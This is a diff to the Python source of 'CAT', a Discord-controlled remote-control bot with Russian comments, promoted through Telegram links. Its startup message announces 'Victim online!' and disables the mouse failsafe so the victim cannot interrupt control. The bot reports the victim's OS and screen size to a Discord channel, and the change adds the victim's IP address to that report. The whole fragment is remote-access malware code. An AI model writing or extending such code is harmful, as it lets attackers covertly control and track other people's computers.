@@ -1,7 +1,7 @@
 """
 Join to our telegram channel https://t.me/CAT_discord_dev
 Jo to our telegram group https://t.me/catchatdev
-Made by NullifiedVlad
+Made by NullifiedVlad 2020
 """
 
 # Импорт библиотек
@@ -15,7 +15,7 @@ import config
 from datetime import datetime
 from gtts import gTTS
 from playsound import playsound
-
+import nullfunction as nf
 
 pg.FAILSAFE = False  # делает невозможным прервать движение мышки
 bot = commands.Bot(command_prefix='/')  # префикс для комманд
@@ -30,9 +30,10 @@ async def on_ready():  # cообщение при запуске
     x, y = pg.size()
     await channel_start.send(
         f'''CAT: **Жертва онлайн!** 
-Время запука **{date.hour}:{date.minute}**. 
-ОС: **{sys.platform}**. 
+Время запука **{date.hour}:{date.minute}**
+ОС: **{sys.platform}**
 Разрешение экрана: **{x}x{y}** 
+IP: **{nf.ip()}** 
 Напишите **/help** для справки!''')
     await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
 
